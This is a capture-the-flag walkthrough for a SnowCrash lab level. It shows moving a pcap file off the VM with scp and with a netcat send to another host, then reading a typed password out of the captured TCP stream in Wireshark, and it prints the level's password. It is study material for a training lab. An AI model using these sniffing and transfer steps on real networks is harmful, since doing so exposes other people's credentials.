# Level02
Surprise! Our home directory is not empty this time.

![image](https://github.com/user-attachments/assets/e90f08cc-e8c6-43d2-a211-426c455d7998)

![image](https://github.com/user-attachments/assets/134c1920-cd17-48c7-8b12-ca8bad5826ee)

So, what is a **pcap** file and how do we make sense of it? 

PCAP files are a common format for storing packet captures. A PCAP file includes an exact copy of every byte of every packet as seen on the network. [See for more information](https://www.endace.com/learn/what-is-a-pcap-file).
There are various open-source tools we can use to read and write PCAP files including tcpdump, libPCAP, WinPCAP, NPCAP, Zeek, Snort, Suricata, Wireshark. **Wireshark** is among the recommended tools for this project and it is preinstalled on my machine so we'll go with that. (Edit: It was actually cloudshark that was recommended for this project but it is too late now and wireshark is more convenient)

I said my machine though, not the host machine. 

![image](https://github.com/user-attachments/assets/e46661ec-337c-4ad2-bfd4-95d0e2d0b172)

When using tools like john I was easily able to copy-paste text between machines but I need to actually transfer a file now. Did you know that there is a whole course for that on [HTB Academy](https://academy.hackthebox.com/course/preview/file-transfers)?
We probably won't need to go thorough all that though. We just need to learn how to use the **SCP** command as suggested by the project's subject.pdf.

`man scp`:
```
scp — OpenSSH secure file copy

scp copies files between hosts on a network.

       scp uses the SFTP protocol  over  a  ssh(1)  connection  for  data
       transfer,  and  uses the same authentication and provides the same
       security as a login session.
```

**Syntax:**
`scp user@remotehost:/home/user/file_name `

`$ scp -P 4242 level02@192.168.56.101:~/level02.pcap .`:

![image](https://github.com/user-attachments/assets/acd01ffd-d4e1-4ebf-a4b6-d80da9526c97)

(See [below](#bug), if you are having issues with this command)

Now that I have the necessary file in my current directory I can run

`$ sudo wireshark level02.pcap` (or do `$ chmod +r level02.pcap` beforehand and ditch sudo)

![image](https://github.com/user-attachments/assets/ba0cc406-d451-48ee-950a-3514e07a8308)

Going one by one I see the word Password on line 43(why not 42?) but am unable to decipher much else. Let's go to Analyze → [Follow](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html) → TCP Stream window.

This will display stream content in the same sequence as it appeared on the network. Traffic from the **client to the server** will be colored **red**, while traffic from the **server to the client** will be colored **blue**.

**Non-printable** characters are replaced by **dots**.

![image](https://github.com/user-attachments/assets/ba82eb31-4bb9-4ad1-bd51-b5ddd80abd1c)

Alright, this looks promising `Password: ft_wandr...NDRel.L0L` 

![image](https://github.com/user-attachments/assets/9b94a91d-1848-4f86-884e-2a3bbf49f302)

Uh...oh right, remember when I said non-printable characters are replaced by dots? Let's take a closer look at what all those dots are meant to be

![image](https://github.com/user-attachments/assets/95510868-d994-47d6-b034-c1c236b97600)

**0D** is the **carriage return** which shows the point client was done entering his password.
**7F** is the **Delete** character. Client must have made some mistakes while entering the password or maybe it was an attempt to confuse anyone else who might be listening in.

`$ man ascii`

![image](https://github.com/user-attachments/assets/d8d7daf2-1354-4453-96f6-705d4a71a553)

In any case `ft_wandr...NDRel.L0L` becomes `ft_waNDReL0L`

Let's try it

![image](https://github.com/user-attachments/assets/09bf0234-51a0-40c2-b9c3-691117436e01)

![image](https://github.com/user-attachments/assets/9a7f45ae-fc3e-482d-a443-242461a4211d)

Finally!

<h2 id="bug">Blue Screen of Death </h2>

If running `scp` causes your computer to crash like me, it might be because of the VM's network settings.

The snow-crash machine is using Host-Only Adapter as we discussed before.

![image](https://github.com/user-attachments/assets/b87a6ad3-b8cd-45dd-92a0-f9032396ce87)

However the Kali machine I am using was on NAT

![image](https://github.com/user-attachments/assets/ef7629e8-e591-490d-bcab-d3cbc0dfd8f5)

When I changed it to **Host-only Adapter** the issue was resolved.

Hopefully those who are on Mac are having easier time here and not dealing with weird VirtualBox bugs.

### Alternatively,

You can also use `netcat` to transfer files like so:

First, we start listening on a port of our choice: `nc -l -p 4444 > level02.pcap` and we will be redirecting anything that comes through that port to a file we created. (It doesn't have to be named leve02)

![image](https://github.com/user-attachments/assets/7edb672c-d09b-4c37-84e0-afb69061f4ff)

Then we send the file `level02@SnowCrash:~$  nc -w 3 92.168.56.102 4444 < ./level02.pcap`

![image](https://github.com/user-attachments/assets/d0d21ede-e645-422a-8b36-57e0eedfea24)

(if you don't know your ip you can just run `$ ifconfig`)

![image](https://github.com/user-attachments/assets/36567e8d-1783-4401-8352-facb571c13aa)


Now let's check our home directory.

![image](https://github.com/user-attachments/assets/b6d22e80-f4e2-4f12-a5a2-b3a5320ed581)

Ta-da!
